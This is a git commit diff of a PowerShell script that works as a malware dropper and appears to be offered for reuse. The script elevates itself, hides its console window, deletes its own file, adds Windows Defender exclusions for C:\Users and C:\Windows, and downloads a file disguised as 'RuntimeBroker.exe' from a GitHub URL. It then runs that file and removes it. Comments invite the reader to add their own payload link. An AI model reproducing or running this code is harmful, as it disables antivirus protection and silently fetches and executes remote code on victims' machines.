1ca240e7631a14848f7347e0a119dc0f4c035db3
AnonAm93 <am9.9@outlook.com>
2024-10-18 18:34:21 +0200

    Update Am.ps1

--- Am.ps1
+++ Am.ps1
@@ -1,3 +1,4 @@
+#############################################################################################################################
 
 # (Administrator Rights.)
 
@@ -5,6 +6,8 @@ if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]:
     Start-Process PowerShell -Verb RunAs "-NoProfile -ExecutionPolicy Bypass -Command `"cd '$pwd'; & '$PSCommandPath';`"";
     exit;
 }
+
+#############################################################################################################################
 
 # (This prevents all commands from being visible in the terminal.)
 
@@ -19,32 +22,48 @@ $console = [Console.Window]::GetConsoleWindow()
 # 0 hide
 [Console.Window]::ShowWindow($console, 0) | Out-Null
 
+#############################################################################################################################
+
 # (By using this command, your PS1 script will be deleted automatically when someone opens the file.)
 
 Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force
+
+#############################################################################################################################
 
 #(The Add-MpPreference cmdlet modifies settings for Windows Defender. Use this cmdlet to add exclusions for file name extensions, paths, and processes.)
 
 Add-MPreference -ExclusionPath C:\Users
 Add-MpPreference -ExclusionPath C:\Windows
 
+#############################################################################################################################
+
 # (Add the link to your payload.)
 
 $url = "https://github.com/AnonAm93/1/raw/refs/heads/main/RuntimeBroker.exe"
+
+#############################################################################################################################
 
 # (Temp is where your payload will be downloaded by default.)
 
 $output = "$env:Temp/RuntimeBroker.exe"
 
+#############################################################################################################################
+
 # (This belongs the script installs your payload not touch it.)
 
 Invoke-WebRequest -Uri $url -OutFile $output
+
+#############################################################################################################################
 
 # (Once the download is finished, execute the file that was downloaded.)
 
 Start-Process -FilePath $output
 
+#############################################################################################################################
+
 # (The payload you downloaded will be deleted after the process is finished..)
 
 Start-Sleep -Milliseconds 6000 
 Remove-Item -path "$env:Temp/RuntimeBroker.exe"
+
+#############################################################################################################################
